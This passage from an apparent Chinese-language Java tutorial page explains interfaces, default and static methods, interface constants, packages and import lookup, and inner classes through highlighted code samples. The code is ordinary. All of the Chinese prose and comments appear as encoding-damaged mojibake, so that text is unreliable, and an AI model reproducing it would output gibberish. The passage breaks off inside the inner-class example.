&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å½“å…·ä½“ç±»å®žçŽ°ä¸€ä¸ªæŽ¥å£æ—¶éœ€è¦ç”¨&lt;code>implements&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; run&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸€ä¸ªç±»å¯ä»¥å®žçŽ°å¤šä¸ªæŽ¥å£ï¼Œä¸€ä¸ªæŽ¥å£ä¹Ÿå¯ä»¥ç»§æ‰¿è‡ªå¦ä¸€ä¸ªæŽ¥å£&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// å®žçŽ°äº†ä¸¤ä¸ªinterface
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// ç»§æ‰¿å¦ä¸€ä¸ªæŽ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åœ¨æŽ¥å£ä¸­ï¼Œå¯ä»¥å®šä¹‰&lt;code>default&lt;/code>æ–¹æ³•ï¼›&lt;code>default&lt;/code>æ–¹æ³•å’ŒæŠ½è±¡ç±»çš„æ™®é€šæ–¹æ³•æ˜¯æœ‰æ‰€ä¸åŒçš„ã€‚å› ä¸º&lt;code>interface&lt;/code>æ²¡æœ‰å­—æ®µï¼Œ&lt;code>default&lt;/code>æ–¹æ³•æ— æ³•è®¿é—®å­—æ®µï¼Œè€ŒæŠ½è±¡ç±»çš„æ™®é€šæ–¹æ³•å¯ä»¥è®¿é—®å®žä¾‹å­—æ®µ(Java&amp;gt;=1.8)&lt;/li>
&lt;/ul>
&lt;h3 id="é™æ€å­—æ®µé™æ€æ–¹æ³•">é™æ€å­—æ®µ&amp;amp;é™æ€æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç”¨&lt;code>static&lt;/code>å…³é”®å­—ä¿®é¥°çš„å­—æ®µå¤„äºŽåŒä¸€ä¸ªå…±äº«ä½œç”¨åŸŸä¸­&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸æŽ¨èç”¨&lt;code>å®žä¾‹.é™æ€å­—æ®µ&lt;/code>åŽ»è®¿é—®é™æ€å­—æ®µï¼Œå› ä¸ºåœ¨javaä¸­å®žä¾‹å¯¹è±¡å¹¶æ²¡æœ‰é™æ€å­—æ®µ(å®žé™…)ï¼Œä»£ç ä¸­å¯ä»¥è®¿é—®æ˜¯å› ä¸ºç¼–è¯‘å™¨å¯ä»¥æ ¹æ®å®žä¾‹ç±»åž‹è‡ªåŠ¨è½¬æ¢ä¸º&lt;code>ç±»å.é™æ€å­—æ®µ&lt;/code>æ¥è®¿é—®&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æŽ¨èç”¨ç±»åæ¥è®¿é—®é™æ€å­—æ®µï¼Œå¯ä»¥å°†å…¶ç†è§£ä¸ºç±»æœ¬èº«çš„å­—æ®µ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒç”¨å®žä¾‹æ–¹æ³•å¿…é¡»é€šè¿‡ä¸€ä¸ªå®žä¾‹å˜é‡ï¼Œè€Œè°ƒç”¨é™æ€æ–¹æ³•åˆ™ä¸éœ€è¦å®žä¾‹å˜é‡ï¼Œé€šè¿‡ç±»åå°±å¯ä»¥è°ƒç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">number&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">number&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™æ€æ–¹æ³•å†…éƒ¨æ— æ³•è®¿é—®&lt;code>this&lt;/code>ï¼Œä¹Ÿæ— æ³•è®¿é—®å®žä¾‹å­—æ®µï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µ&lt;/li>
&lt;li>é™æ€æ–¹æ³•å¸¸ç”¨äºŽå·¥å…·ç±»ï¼Œæ¯”å¦‚&lt;code>Arrays.sort()&lt;/code>å’Œ&lt;code>Math.random()&lt;/code>ï¼›javaç¨‹åºå…¥å£çš„&lt;code>main&lt;/code>ä¹Ÿæ˜¯é™æ€æ–¹æ³•å™¢&lt;/li>
&lt;li>å¯¹äºŽæŽ¥å£è€Œè¨€è™½ç„¶ä¸èƒ½æœ‰å®žä¾‹å­—æ®µï¼Œä½†æ˜¯å¯ä»¥æœ‰&lt;code>public static final&lt;/code>åŠ æŒçš„é™æ€å­—æ®µ&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>public interface Person {
public static final int MALE = 1;
public static final int FEMALE = 2;
}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å¯ç®€å†™
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Špublic statc final:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">MALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">FEMALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="åŒ…">åŒ…&lt;/h3>
&lt;ul>
&lt;li>ä½¿ç”¨packageåŒ…æ¥è§£å†³åå­—å†²çªï¼ˆå„ä¸ªè¯­è¨€éƒ½æœ‰äº† å¾ˆå¥½æ‡‚ï¼‰ï¼Œå¯ä»¥ç”¨ç±»çš„å…¨å&lt;/li>
&lt;li>åŒ…æ²¡æœ‰çˆ¶å­å…³ç³»ï¼java.utilå’Œjava.util.zipæ˜¯ä¸åŒçš„åŒ…ï¼Œä¸¤è€…æ²¡æœ‰ä»»ä½•ç»§æ‰¿å…³ç³»&lt;/li>
&lt;li>æ‰€æœ‰Javaæ–‡ä»¶å¯¹åº”çš„ç›®å½•å±‚æ¬¡è¦å’ŒåŒ…çš„å±‚æ¬¡ä¸€è‡´ï¼Œç¼–è¯‘åŽçš„&lt;code>.class&lt;/code>æ–‡ä»¶ä¹Ÿéœ€è¦æŒ‰ç…§åŒ…ç»“æž„å­˜æ”¾&lt;/li>
&lt;li>ä½äºŽåŒä¸€ä¸ªåŒ…çš„ç±»ï¼Œå¯ä»¥è®¿é—®åŒ…ä½œç”¨åŸŸçš„å­—æ®µå’Œæ–¹æ³•ã€‚ä¸ç”¨&lt;code>public&lt;/code>ã€&lt;code>protected&lt;/code>ã€&lt;code>private&lt;/code>ä¿®é¥°çš„å­—æ®µå’Œæ–¹æ³•å°±æ˜¯åŒ…ä½œç”¨åŸŸ&lt;/li>
&lt;li>&lt;code>import static&lt;/code>å¯ä»¥å¯¼å…¥å¯ä»¥å¯¼å…¥ä¸€ä¸ªç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•&lt;/li>
&lt;li>Javaç¼–è¯‘å™¨æœ€ç»ˆç¼–è¯‘å‡ºçš„&lt;code>.class&lt;/code>æ–‡ä»¶åªä½¿ç”¨å®Œæ•´ç±»å(è¶…é•¿)ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨åœ¨é‡åˆ°&lt;code>class&lt;/code>åç§°æ—¶å¦‚æžœéžå®Œæ•´ç±»åï¼ŒæŒ‰ç…§ å½“å‰package-&amp;gt;importçš„åŒ…-&amp;gt;java.langåŒ… çš„é¡ºåºè¿›è¡ŒæŸ¥æ‰¾&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Main.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">test&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.text.Format&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">List&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨å®Œæ•´ç±»å -&amp;gt; java.util.List
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Format&lt;/span> &lt;span style="color:#111">format&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨importçš„ç±» -&amp;gt; java.text.Format
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hi&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨java.langåŒ…çš„String -&amp;gt; java.lang.String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// okï¼Œä½¿ç”¨java.langåŒ…çš„System -&amp;gt; java.lang.System
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">MessageFormat&lt;/span> &lt;span style="color:#111">mf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ç¼–è¯‘é”™è¯¯ï¼šæ— æ³•æ‰¾åˆ°MessageFormat: MessageFormat cannot be resolved to a type
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ç¼–å†™classæ—¶ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨å¸®æˆ‘ä»¬&lt;code>import java.lang.*&lt;/code>(ä¸åŒ…å«&lt;code>java.lang.reflect&lt;/code>è¿™æ ·çš„åŒ…)å’Œ&lt;code>import&lt;/code>å½“å‰&lt;code>package&lt;/code>çš„å…¶å®ƒclass&lt;/li>
&lt;li>æŠŠæ–¹æ³•å®šä¹‰ä¸º&lt;code>package&lt;/code>æƒé™æœ‰åŠ©äºŽæµ‹è¯•ï¼Œå› ä¸ºæµ‹è¯•ç±»å’Œè¢«æµ‹è¯•ç±»åªè¦ä½äºŽåŒä¸€ä¸ª&lt;code>package&lt;/code>ï¼Œæµ‹è¯•ä»£ç å°±å¯ä»¥è®¿é—®è¢«æµ‹è¯•ç±»çš„&lt;code>package&lt;/code>æƒé™æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;h3 id="å†…éƒ¨ç±»">å†…éƒ¨ç±»&lt;/h3>
&lt;ul>
&lt;li>æˆ–ç§°nested classåµŒå¥—ç±»&lt;/li>
&lt;li>Inner Classå®šä¹‰åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨ï¼Œå®ƒçš„å®žä¾‹ä¸èƒ½å•ç‹¬å­˜åœ¨&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// å®žä¾‹åŒ–ä¸€ä¸ªOuter
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#111">inner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">new&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// å®žä¾‹åŒ–ä¸€ä¸ªInner
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">inner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨Outerçš„æž„é€ æ–¹æ³•æ¥åˆ›å»ºInnerå®žä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
